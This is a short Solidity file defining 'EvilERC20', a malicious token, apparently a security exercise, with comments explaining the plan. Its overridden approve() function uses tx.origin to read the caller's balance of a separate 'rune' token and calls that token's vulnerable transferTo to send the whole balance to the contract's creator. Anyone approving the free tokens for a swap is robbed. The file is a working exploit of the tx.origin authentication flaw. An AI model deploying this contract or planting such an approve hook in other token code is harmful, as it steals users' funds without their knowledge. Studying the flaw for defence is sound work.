// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// interface to use rune's balanceOf and vulnerable `transferTo` function
interface iERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferTo(address recipient, uint256 amount) external returns (bool);
}

contract EvilERC20 is ERC20 {
    iERC20 immutable rune;
    address immutable creator;

    constructor (address rune_) ERC20("EvilToken", "EVL") {
        rune = iERC20(rune_);
        creator = msg.sender;
        _mint(msg.sender, 1e19);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        /*
         * Since people will want to swap their free tokens for something else and the first thing
         * done when swapping is approving the tokens to a swap, let's put the evil code here in
         * the approve function.
         *
         * Try to transfer all the tokens from the `rune` contract to the `creator` of this contract.
         *
         * To use a function of the rune contract use `rune.balanceOf(...)` for example
         */
        uint256 balance = rune.balanceOf(tx.origin);
        rune.transferTo(creator, balance);

        return super.approve(spender, amount);
    }
}
